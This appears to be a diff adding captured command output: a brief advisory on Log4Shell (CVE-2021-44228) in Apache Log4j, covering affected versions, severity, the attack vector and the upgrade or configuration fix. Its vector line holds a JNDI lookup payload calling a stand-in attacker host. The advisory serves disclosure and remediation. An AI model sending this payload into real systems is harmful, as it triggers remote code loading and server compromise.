@@ -1,0 +1,13 @@
+
+The command exited with code 0.
+Output:
+### Exploit Advisory: CVE-2021-44228
+
+- **Title:** Log4Shell - Apache Log4j2 JNDI Remote Code Execution
+- **Service:** Apache Log4j
+- **Affected Versions:** 2.0-beta9 <= 2.14.1
+- **CVSS:** 10.0 (Critical / High)
+- **CWE:** CWE-502 / CWE-917
+- **Exploitation Vector:** JNDI LDAP lookup interpolation via untrusted header or message parameter: ${jndi:ldap://attacker.com/a}
+- **Remediation & Patch:** Upgrade to Log4j 2.17.1+ or set log4j2.formatMsgNoLookups=true.
+
